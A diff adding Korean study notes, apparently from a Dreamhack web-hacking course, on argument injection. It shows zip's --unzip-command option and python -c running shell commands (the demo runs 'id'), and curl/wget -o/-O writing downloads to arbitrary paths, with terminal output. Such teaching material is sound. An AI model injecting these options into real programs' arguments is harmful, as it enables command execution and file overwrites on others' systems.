@@ -1,0 +1,82 @@
+취약한 실행 파일 :
+    ls 명령어에 옵션을 추가한다고 해서 특별히 커맨드 실행이 가능한 것은 아닙니다.
+    하지만 몇 개의 프로그램에서는 옵션으로 원하는 커맨드를 실행할 수 있는 기능을 제공하고 있습니다.
+    대표적인 프로그램으로 zip / python이 있으며 해당 기능은 다음과 같이 이용할 수 있습니다.
+
+1) zip
+    ex)
+        # zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c id"
+        $ strace -e execve zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c id"
+        execve("/usr/bin/zip", ["zip", "/tmp/test.zip", "/etc/passwd", "-T", "--unzip-command=sh -c id"], 0x7fffe1dc1320 /* 31 vars */) = 0
+        updating: etc/passwd (deflated 64%)
+        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
+        --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=13097, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+        test of /tmp/test.zip OK
+        +++ exited with 0 +++
+
+2) python
+    ex)
+        # python -c "[Python Code]" input.py
+        
+        $ python -c '__import__("os").system("id")' input.py
+        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
+
+3) curl / wget
+    curl과 wget 명령어는 URL을 입력으로 받은 후 접속하는 CLI 프로그램입니다. 
+    앞선 예제처럼 원하는 커맨드를 실행할 순 없지만 옵션을 통해 임의 경로에 다운로드 결과를 저장할 수 있습니다.
+    ex)
+        $ curl -h | grep " -o,"
+        -o, --output <file> Write to file instead of stdout
+        
+        $ wget -h | grep " -O"
+        -O,  --output-document=FILE      write documents to FILE
+
+    아래 예시와 같이 URL을 통해 다운로드받은 결과를 옵션으로 지정된 파일 이름으로 저장할 수 있습니다.
+    ex)
+        $ curl  http://dreamhack.local -o hello.txt
+            % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                        Dload  Upload   Total   Spent    Left  Speed
+        100   288  100   288    0     0  10666      0 --:--:-- --:--:-- --:--:-- 10666
+        
+        $ cat hello.txt 
+        Hello !
+        
+        $ wget http://dreamhack.local -O hello.txt
+        --2020-05-20 14:28:56--  http://dreamhack.local/
+        Resolving dreamhack.local (dreamhack.local)... 127.0.0.1
+        Connecting to dreamhack.local (dreamhack.local)|127.0.0.1|:80... connected.
+        HTTP request sent, awaiting response... 200 OK
+        Length: 288 [text/html]
+        Saving to: ‘hello.txt’
+        
+        hello.txt                    100%[============================================>]     288  --.-KB/s    in 0s      
+        
+        2020-05-20 14:28:56 (22.9 MB/s) - ‘hello.txt’ saved [288/288]
+        
+        $ cat hello.txt 
+        Hello !
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
